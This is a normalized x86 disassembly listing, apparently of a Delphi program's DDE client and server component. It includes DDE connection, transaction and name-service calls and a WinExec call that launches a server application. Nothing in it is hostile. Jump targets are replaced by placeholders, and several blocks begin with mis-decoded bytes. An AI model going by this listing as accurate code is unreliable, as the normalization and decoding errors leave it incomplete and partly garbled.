add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esi
mov edx ebp
mov eax ebx
call sub_46c0a8
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x34 ]
mov [ esp ] eax
mov [ esp + 0x4 ] esi
xor eax eax
mov [ esp + 0x8 ] eax
xor eax eax
mov [ esp + 0xc ] eax
push 0x0
push 0x1
push 0x0
push 0x0
push 0x10
lea eax [ esp + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateDataHandle
mov edi eax
sub_46c1c0
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_46c291
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_46d93c
mov ebx eax
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1008 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ esi + 0x44 ]
push eax
call DdeQueryStringA
mov ecx eax
lea edx [ ebp - 0x1008 ]
lea eax [ ebp - 0x8 ]
call sub_4040f8
lea eax [ ebx + 0x30 ]
mov edx [ ebp - 0x8 ]
call sub_40405c
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_46c3cc
mov [ ebx + 0x3c ] eax
cmp [ ebx + 0x3c ] 0x0
jne r-xdata
mov [ ebx + 0x40 ] edi
push ebx
push 0xffffffff
push edi
call DdeSetUserHandle
mov edx ebx
mov eax [ esi + 0x38 ]
call sub_4181b4
mov eax [ ebx + 0x3c ]
test eax eax
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_46c41c
mov [ ebx + 0x38 ] eax
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c298
lea eax [ ebp - 0x8 ]
call sub_404008
retn
mov si 0xffef
call sub_40348c
sub_46c2a4
push ebx
push esi
push edi
mov edi eax
mov ebx edx
mov eax [ ebx + 0x3c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x40 ]
test eax eax
je r-xdata
mov si 0xffee
call sub_40348c
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ edi + 0x38 ]
test eax eax
je r-xdata
push 0x0
push 0xffffffff
push eax
call DdeSetUserHandle
pop edi
pop esi
pop ebx
retn
mov edx ebx
call sub_4184ac
mov eax ebx
call sub_403290
sub_46c2ec
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_403a0c#9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_46c3a0
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_408550
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x30 ]
call sub_40405c
mov edx [ ebx + 0x30 ]
mov eax r-xdata
call sub_40460c
mov esi eax
test esi esi
je r-xdata
push 0x3ec
mov eax [ ebx + 0x30 ]
call sub_4044c8
push eax
mov eax [ ebx + 0x44 ]
push eax
call DdeCreateStringHandleA
mov esi eax
mov [ ebx + 0x34 ] esi
push 0x1
push 0x0
push esi
mov eax [ ebx + 0x44 ]
push eax
call DdeNameService
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c38f
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov eax [ ebx + 0x30 ]
call sub_4042c8
mov ecx eax
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_404568
sub_46c3a0
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x34 ] eax
pop ebx
retn
push 0x2
push 0x0
push eax
mov eax [ ebx + 0x44 ]
push eax
call DdeNameService
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x44 ]
push eax
call DdeFreeStringHandle
sub_46c3cc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
xor eax eax
mov [ esp + 0x4 ] eax
mov eax [ ebp + 0x40 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov eax [ ebp + 0x40 ]
mov edx edi
call sub_418310
mov ebx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_407ec0
test eax eax
jne r-xdata
sub_46c41c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
xor eax eax
push ebp
push sub_46c49e
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_466104
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c4a5
lea eax [ ebp - 0xc ]
call sub_404008
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x8 ] ebx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_4660f0
mov ebx eax
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_448af4
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_407ec0
test eax eax
jne r-xdata
sub_46c4b0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
xor eax eax
mov [ esp + 0x4 ] eax
mov eax [ ebp + 0x38 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov eax [ ebp + 0x38 ]
mov edx edi
call sub_418310
mov ebx eax
mov edx [ esp ]
mov eax [ ebx + 0x30 ]
call sub_407ec0
test eax eax
jne r-xdata
sub_46c500
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4044b8
xor eax eax
push ebp
push sub_46c557
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax ebx
call sub_46c4b0
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c55e
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov edx [ ebp - 0x4 ]
call sub_46de24
test eax eax
je r-xdata
call sub_46e008
sub_46c584
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_420714
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ esi + 0x9c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax esi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_46c5cc
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov eax esi
call sub_46cc10
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420760
mov eax [ esi + 0x9c ]
call sub_403290
xor eax eax
mov [ esi + 0x9c ] eax
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_46c60c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_420a8c
push ebx
push sub_46c6dc
push ebx
push r-xdata
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov cl 0x1
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
xor ecx ecx
jmp r-xdata
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_46c659
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_46c6d0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_420b64
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x30 ]
call sub_4040a0
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x34 ]
call sub_4040a0
mov eax [ ebp - 0x4 ]
call sub_4042c8
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c6d7
cmp [ ebx + 0xc5 ] 0x1
je r-xdata
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46c9cc
sub_46c6dc
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor eax eax
push ebp
push j_sub_403a0c#8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_41ca50
jmp r-xdata
mov eax esi
call sub_41baec
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_41d6f0
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_40460c
mov ebx eax
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4042c8
mov ecx eax
sub ecx ebx
lea edx [ ebx + 0x1 ]
mov eax [ ebp - 0x4 ]
call sub_404528
mov eax [ ebp - 0x4 ]
mov al [ eax ]
sub al 0x53
je r-xdata
mov eax esi
call sub_41ca58
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c78e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40402c
retn
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_46ceb4
jmp r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_46cec8
jmp r-xdata
sub_46c79b
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push j_sub_403a0c#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41ec5c
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x30 ]
call sub_4040a0
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x10 ]
xor ecx ecx
mov eax r-xdata
call sub_408d00
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_4203c0
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x34 ]
call sub_4040a0
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x10 ]
xor ecx ecx
mov eax r-xdata
call sub_408d00
mov edx [ ebp - 0x14 ]
mov eax ebx
call sub_4203c0
mov eax ebx
call sub_41ec64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c85e
lea eax [ ebp - 0x14 ]
call sub_404008
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40402c
retn
sub_46c88c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46d1a0
mov esi eax
mov eax [ ebx + 0x9c ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_41838c
mov [ esi + 0x10 ] edi
xor edx edx
mov eax esi
call sub_46d210
pop edi
pop esi
pop ebx
retn
sub_46c8c4
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_46c984
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_46d210
mov edx ebx
mov eax [ esi + 0x9c ]
call sub_4184ac
mov eax ebx
call sub_403290
sub_46c8fc
push ebx
push esi
push edi
push ebp
push ecx
mov ebp ecx
mov edi edx
mov esi eax
mov [ esp ] 0x1
mov edx edi
mov eax esi
call sub_46c984
mov ebx eax
test ebx ebx
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebp
call sub_4042c8
test eax eax
jle r-xdata
test ebx ebx
je r-xdata
mov eax ebp
call sub_4042c8
test eax eax
jne r-xdata
mov edx edi
mov eax esi
call sub_46c88c
mov edx edi
mov eax esi
call sub_46c984
mov ebx eax
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax ebx
call sub_46d210
mov [ esp ] al
cmp [ esp ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_46c8c4
jmp r-xdata
test [ esi + 0x1c ] 0x1
jne r-xdata
mov edx edi
mov eax esi
call sub_46c8c4
sub_46c984
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
xor eax eax
mov [ esp + 0x4 ] eax
xor ebx ebx
jmp r-xdata
movzx ebp bx
mov edi [ esi + 0x9c ]
cmp ebp [ edi + 0x8 ]
jl r-xdata
mov edx ebp
mov eax edi
call sub_418310
mov edx [ eax + 0x10 ]
cmp edx [ esp ]
jne r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
mov [ esp + 0x4 ] eax
jmp r-xdata
sub_46c9cc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_46cc10
mov edx ebx
mov eax esi
call sub_46ceb4
mov edx edi
mov eax esi
call sub_46cec8
mov eax esi
call sub_46ca1c
mov ebx eax
test bl bl
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
xor edx edx
mov eax esi
call sub_46ceb4
xor edx edx
mov eax esi
call sub_46cec8
sub_46ca1c
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x108 ] edx
mov edi eax
xor eax eax
push ebp
push sub_46cbf2
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x0
cmp [ edi + 0x38 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46cbf9
lea eax [ ebp - 0x108 ]
call sub_404008
retn
mov eax [ edi + 0x30 ]
call sub_4042c8
test eax eax
jne r-xdata
cmp [ edi + 0xa0 ] 0x0
jne r-xdata
mov eax [ edi + 0x34 ]
call sub_4042c8
test eax eax
jne r-xdata
cmp [ edi + 0xa4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x101 ]
mov edx [ edi + 0x30 ]
call sub_4086d0
push 0x3ec
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ edi + 0xa0 ] eax
mov eax edi
call sub_46cc90
jmp r-xdata
mov ecx [ edi + 0xa4 ]
mov edx [ edi + 0xa0 ]
mov eax edi
call sub_46ccd0
mov ebx eax
test bl bl
jne r-xdata
lea eax [ ebp - 0x101 ]
mov edx [ edi + 0x34 ]
call sub_4086d0
push 0x3ec
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ edi + 0xa4 ] eax
test bl bl
jne r-xdata
mov eax [ edi + 0x30 ]
call sub_4042c8
test eax eax
jne r-xdata
mov eax [ edi + 0x58 ]
test eax eax
je r-xdata
mov eax edi
call sub_46cc90
jmp r-xdata
mov eax [ edi + 0xc0 ]
call sub_4042c8
test eax eax
je r-xdata
mov eax [ edi + 0xc0 ]
call sub_4042c8
test eax eax
je r-xdata
mov [ edi + 0xa8 ] 0x1
mov [ edi + 0xa8 ] eax
jmp r-xdata
push [ edi + 0x30 ]
push r-xdata
push [ edi + 0x34 ]
lea eax [ ebp - 0x108 ]
mov edx 0x3
call sub_404388
mov edx [ ebp - 0x108 ]
lea eax [ ebp - 0x101 ]
call sub_4086d0
lea eax [ ebp - 0x101 ]
mov edx [ edi + 0xc0 ]
call sub_4086d0
jmp r-xdata
mov eax edi
mov si 0xffee
call sub_40348c
xor ecx ecx
xor edx edx
mov eax edi
call sub_46cdf4
mov [ ebp - 0x1 ] 0x1
mov eax edi
call sub_46cd48
test al al
je r-xdata
mov ecx [ edi + 0xa4 ]
mov edx [ edi + 0xa0 ]
mov eax edi
call sub_46ccd0
mov ebx eax
push 0x7
lea eax [ ebp - 0x101 ]
push eax
call WinExec
cmp eax 0x20
jb r-xdata
sub_46cc10
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
mov esi eax
mov eax ebx
call sub_46cdb0
xor eax eax
mov [ ebx + 0x38 ] eax
push 0x0
push 0xffffffff
push esi
call DdeSetUserHandle
push esi
call DdeDisconnect
mov eax [ ebx + 0xa4 ]
test eax eax
je r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0xa0 ] eax
xor edx edx
mov eax ebx
call sub_46ceb4
xor edx edx
mov eax ebx
call sub_46cec8
pop esi
pop ebx
retn
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0xa4 ] eax
sub_46cc90
push ebx
push esi
mov esi eax
mov eax [ esi + 0x9c ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov bx [ eax + 0x8 ]
dec ebx
test bx bx
jb r-xdata
inc ebx
mov eax [ esi + 0x9c ]
xor edx edx
call sub_418310
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x10 ]
call sub_46d08c
dec bx
jne r-xdata
sub_46ccd0
push ebx
push esi
push edi
push ebp
add esp 0xffffffdc
mov ebp ecx
mov edi edx
mov esi eax
mov eax esp
xor ecx ecx
mov edx 0x24
call sub_402ca4
mov [ esp ] 0x24
mov [ esp + 0xc ] 0x3ec
push esp
push ebp
push edi
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeConnect
mov ebx eax
mov [ esi + 0x38 ] ebx
test ebx ebx
setne al
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x24
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x3c ] 0x60
lea eax [ esi + 0x3c ]
push eax
push 0xffffffff
mov eax [ esi + 0x38 ]
push eax
call DdeQueryConvInfo
push esi
push 0xffffffff
mov eax [ esi + 0x38 ]
push eax
call DdeSetUserHandle
sub_46cd48
push ebx
push esi
push edi
push ebp
mov esi eax
xor eax eax
cmp [ esi + 0x38 ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
xor ebx ebx
jmp r-xdata
movzx ebp bx
mov edi [ esi + 0x9c ]
cmp ebp [ edi + 0x8 ]
jl r-xdata
mov edx ebp
mov eax edi
call sub_418310
mov edi eax
mov eax edi
call sub_46d410
test al al
jne r-xdata
mov al 0x1
inc ebx
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ edi + 0x10 ]
call sub_46d08c
jmp r-xdata
movzx eax bx
mov edx [ esi + 0x9c ]
cmp eax [ edx + 0x8 ]
jge r-xdata
sub_46cdb0
push ebx
push esi
push edi
push ebp
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
xor eax eax
mov [ edi + 0x38 ] eax
xor ebx ebx
jmp r-xdata
mov eax edi
mov si 0xffef
call sub_40348c
movzx ebp bx
mov esi [ edi + 0x9c ]
cmp ebp [ esi + 0x8 ]
jl r-xdata
mov edx ebp
mov eax esi
call sub_418310
call sub_46d508
inc ebx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_46cdf4
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov [ esp ] edx
mov esi eax
xor ebx ebx
jmp r-xdata
movzx eax bx
mov ebp [ esi + 0x9c ]
cmp eax [ ebp + 0x8 ]
jl r-xdata
movzx edx bx
mov eax ebp
call sub_418310
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ esp ]
call sub_46d2bc
cmp edi [ eax + 0x8 ]
jne r-xdata
inc ebx
sub_46ce34
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0xc5 ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov [ esi + 0xc5 ] bl
mov eax [ esi + 0x30 ]
call sub_4042c8
test eax eax
je r-xdata
mov eax [ esi + 0x34 ]
call sub_4042c8
test eax eax
je r-xdata
mov eax esi
call sub_46ca1c
test al al
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b84c
call sub_403a44
sub_46cf1c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] cl
mov [ esp ] edx
mov ebx eax
mov cl [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
call sub_420a30
cmp [ esp + 0x4 ] 0x1
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x9c ] 0x0
je r-xdata
xor esi esi
jmp r-xdata
movzx edi si
mov ebp [ ebx + 0x9c ]
cmp edi [ ebp + 0x8 ]
jl r-xdata
mov edx edi
mov eax ebp
call sub_418310
mov edx [ eax + 0x10 ]
cmp edx [ esp ]
jne r-xdata
mov eax [ ebx + 0x9c ]
cmp edi [ eax + 0x8 ]
jge r-xdata
mov eax edx
mov edx [ rw-data ]
mov edx [ edx ]
call sub_46d08c
inc esi
sub_46cf90
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_420714
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ esi + 0x30 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax esi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_46cfd4
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov eax [ esi + 0x30 ]
call sub_403290
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420760
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_46d004
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46d07f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ ebx + 0x34 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d086
lea eax [ ebp - 0x4 ]
call sub_404008
retn
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x38 ]
call sub_4040a0
lea eax [ ebx + 0x38 ]
call sub_404008
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x34 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_46c8c4
mov edx ebx
call sub_4207e4
mov eax [ ebp - 0x4 ]
call sub_4042c8
test eax eax
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46d08c
sub_46d08c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
lea eax [ ebx + 0x38 ]
mov edx esi
call sub_40405c
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x34 ]
call sub_46c8fc
test al al
jne r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x38 ]
mov edx esi
call sub_40405c
test [ ebx + 0x1c ] 0x1
je r-xdata
lea eax [ ebx + 0x38 ]
call sub_404008
pop esi
pop ebx
retn
mov eax [ ebx + 0x34 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
cmp [ eax + 0xc5 ] 0x1
je r-xdata
sub_46d0e8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_420a30
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x34 ]
jne r-xdata
mov edx edi
mov eax [ edi + 0x34 ]
call sub_46c8c4
xor eax eax
mov [ edi + 0x34 ] eax
lea eax [ edi + 0x38 ]
call sub_404008
sub_46d124
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_4034a4
test al al
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_46d16c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax esi
call sub_404008
pop esi
pop ebx
retn
mov ecx esi
xor edx edx
mov eax [ ebx + 0x30 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
pop esi
pop ebx
retn
sub_46d1a0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403260
xor eax eax
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_46d1e4
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov eax esi
call sub_46d4c8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4188e0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_46d210
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_46d2ad
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
call sub_4040a0
cmp [ esi + 0x8 ] 0x0
je r-xdata
lea eax [ esi + 0x4 ]
mov edx edi
call sub_40405c
mov eax [ esi + 0x10 ]
mov eax [ eax + 0x30 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ esi + 0x4 ]
call sub_4042c8
test eax eax
je r-xdata
mov eax esi
call sub_46d4c8
mov eax esi
call sub_46d398
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d2b4
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov eax [ esi + 0xc ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
cmp [ eax + 0xc5 ] 0x1
jne r-xdata
mov eax esi
call sub_46d410
mov ebx eax
test bl bl
jne r-xdata
mov bl 0x1
lea eax [ esi + 0x4 ]
call sub_404008
jmp r-xdata
sub_46d2bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46d389
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_46d400
mov edx eax
lea eax [ ebp - 0x8 ]
call sub_404200
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax ebx
call sub_46d398
jmp r-xdata
mov eax ebx
call sub_46d528
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x30 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov edx esi
mov eax ebx
call sub_46d408
mov eax [ ebx + 0xc ]
cmp [ eax + 0xc7 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d390
lea eax [ ebp - 0x8 ]
call sub_404008
retn
mov eax [ ebp - 0x8 ]
call sub_4042c8
mov edi eax
test edi edi
jle r-xdata
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x30 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov esi 0x1
inc esi
dec edi
jne r-xdata
cmp al 0x20
jae r-xdata
mov eax [ ebp - 0x8 ]
mov al [ eax + esi - 0x1 ]
test al al
jbe r-xdata
lea eax [ ebp - 0x8 ]
call j_sub_4044d4
mov [ eax + esi - 0x1 ] 0x20
sub_46d398
push ebx
push esi
push edi
push ecx
mov edi eax
xor ebx ebx
mov eax [ edi + 0xc ]
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
mov eax edi
call sub_46d528
cmp [ edi + 0x8 ] 0x0
je r-xdata
cmp [ eax + 0xc6 ] 0x1
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x3e8
push 0x20b0
mov eax [ eax + 0xa8 ]
push eax
mov eax [ edi + 0x8 ]
push eax
push edx
push 0xffffffff
push 0x0
call DdeClientTransaction
mov esi eax
test esi esi
je r-xdata
mov edx esi
mov eax edi
